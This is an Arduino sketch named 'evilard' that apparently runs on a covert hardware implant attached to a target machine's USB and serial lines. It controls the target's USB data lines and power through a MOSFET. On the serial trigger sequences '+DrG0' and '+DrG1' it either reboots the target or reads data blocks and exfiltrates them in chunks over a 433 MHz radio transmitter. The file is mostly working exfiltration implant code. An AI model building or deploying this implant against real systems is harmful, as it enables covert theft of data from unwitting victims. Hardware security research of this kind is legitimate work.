/*
** MIT LICENSE
** Copyright <2020> <David Reguera Garcia aka Dreg> dreg@fr33project.org
** http://www.fr33project.org - https://github.com/David-Reguera-Garcia-Dreg
**
** Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
** associated documentation files (the "Software"), to deal in the Software without restriction,
** including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
** and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so,
** subject to the following conditions:
**
** The above copyright notice and this permission notice shall be included in all copies or substantial
** portions of the Software.
**
** THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
** LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
** IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
** WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
** SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include <AltSoftSerial.h> // install this library https://www.pjrc.com/teensy/td_libs_AltSoftSerial.html from menu tools > manage libraries
 
/*  if you want use the AltSoftSerial at same time with RadioHead you need modify RadioHead library http://www.airspayce.com/mikem/arduino/RadioHead/ 
 *  C:\Users\[USER]\Documents\Arduino\libraries\RadioHead
 *  uncomment in RH_ASK.cpp #define RH_ASK_ARDUINO_USE_TIMER2 
 *  then you can import the modified version from menu sketch > include library > add .zip library  
*/
#include <RH_ASK.h> 

#ifdef RH_HAVE_HARDWARE_SPI
#include <SPI.h> // Not actually used but needed to compile
#endif

#define OE_PIN A5
#define S_PIN A4

#define MOSFET_PIN 4 // P-CHANNEL MOSFET

AltSoftSerial mySerial; // default RX 8, default TX 9

RH_ASK rf_driver; //default data pin 12

void EnableMosGate(void)
{
  delay(500);
  Serial.println("\r\nenable mosgate");
  digitalWrite(MOSFET_PIN, LOW); 
  delay(500);
}

void DisableMosGate(void)
{
  delay(500);
  Serial.println("\r\ndisable mosgate");
  digitalWrite(MOSFET_PIN, HIGH); 
  delay(500);
}

int GetSState(void)
{
  return digitalRead(S_PIN);
}

void ToggleDataLines(unsigned int nwst)
{
  ChangeDataLines(!GetSState());
}

void ChangeDataLines(unsigned int nwst)
{
  delay(500);
  digitalWrite(OE_PIN, HIGH); 
  delay(500);
  digitalWrite(S_PIN, nwst); 
  Serial.print("\r\nswitch USB:  S ");
  Serial.println(nwst ? "HIGH" : "LOW");
  delay(500);
  digitalWrite(OE_PIN, LOW); 
  delay(500);
}

void ConnectDataLines(void)
{
  ChangeDataLines(HIGH);
}

void DisconnectDataLines(void)
{
  ChangeDataLines(LOW);
}

void InitU(void)
{
    pinMode(OE_PIN, OUTPUT);
    pinMode(S_PIN, OUTPUT); 
    pinMode(MOSFET_PIN, OUTPUT); 

    DisconnectDataLines();
    DisableMosGate();
}

void PowerOn(void)
{
  EnableMosGate();
  ChangeDataLines(HIGH);
}

void PowerOff(void)
{   
  ChangeDataLines(LOW);
  DisableMosGate();
}

void Reboot(void)
{
  delay(10000);
  PowerOff();
  delay(10000);
  PowerOn();
}

void setup() 
{
  Serial.begin(9600);
  while (!Serial){ }

  mySerial.begin(9600);
  
  Serial.println("\r\n-\r\n"
    "evilard (MIT LICENSE) by David Reguera Garcia aka Dreg - dreg@fr33project.org\r\n"
    "http://www.fr33project.org - https://github.com/David-Reguera-Garcia-Dreg\r\n"
    "-\r\n");
  
  Serial.println("waiting a few secs to start....\r\n");

  rf_driver.init();

  Serial.print("\r\nMAX MSG LENGHT: ");
  Serial.println(rf_driver.maxMessageLength()); 

  InitU();
  delay(3000);
  PowerOn();
}

char read_byte;

#define ReadByte(x) while (!mySerial.available()) { delay(1); } \
                    x = mySerial.read(); \
                    Serial.write(x); 
                 

uint8_t block_to_xfl[252];
uint8_t lst_blkid;
void ExfBlk()
{
  uint8_t* ptr_chnk;
  uint8_t i, j; 
  uint8_t curblk[19];
  
  for (i = 0; i < sizeof(block_to_xfl); i++)
  {
    ReadByte(read_byte);
    block_to_xfl[i] = read_byte;
  }

  ptr_chnk = block_to_xfl;
  for (i = 0; i < 14; i++)
  {
    curblk[0] = ++lst_blkid;
    memcpy(curblk + 1, ptr_chnk, sizeof(curblk) - 1); 

   for (j = 0; j < 10; j++)
    {
      if (rf_driver.send(curblk, sizeof(curblk)))
      {
        //Serial.println("\r\nSUCCESS SENDED CONNECTED_TO_TARGET_STR 433 mghz...\r\n"); 
        //Serial.write(ptr_chnk, 32);
        //Serial.println("");
      }
      else
      {
        Serial.println("\r\nERROR sending chunk 433 mghz...\r\n"); 
      }
      rf_driver.waitPacketSent(); 
      delay(2000);
    }
    
    ptr_chnk += 18;
  }
}

void loop()
{
  ReadByte(read_byte);
  if (read_byte == '+')
  {
    ReadByte(read_byte);
    if (read_byte == 'D')
    {
      ReadByte(read_byte);
      if (read_byte == 'r')
      {
        ReadByte(read_byte);
        if (read_byte == 'G')
        {
          ReadByte(read_byte);
          Serial.println("");
          switch (read_byte)
          {
            case '0':
              Reboot();
            break;
            
            case '1':
              ExfBlk();
            break;
          }
        }
      }
    }
  }
}
